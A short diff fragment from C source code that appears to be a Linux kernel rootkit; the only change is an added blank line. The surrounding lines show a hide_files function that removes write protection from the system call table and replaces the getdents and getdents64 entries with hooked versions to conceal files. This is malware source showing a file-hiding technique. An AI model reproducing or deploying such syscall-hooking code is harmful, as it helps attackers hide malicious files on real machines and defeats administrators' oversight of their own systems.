@@ -119,6 +119,7 @@ void hide_files(void){
   // remove write protection
   make_page_writable((long unsigned int) ptr_sys_call_table);
 
+
   //hook getdents
   sys_call_table[__NR_getdents] = (void*) hooked_getdents;
   sys_call_table[__NR_getdents64] = (void*) hooked_getdents64;
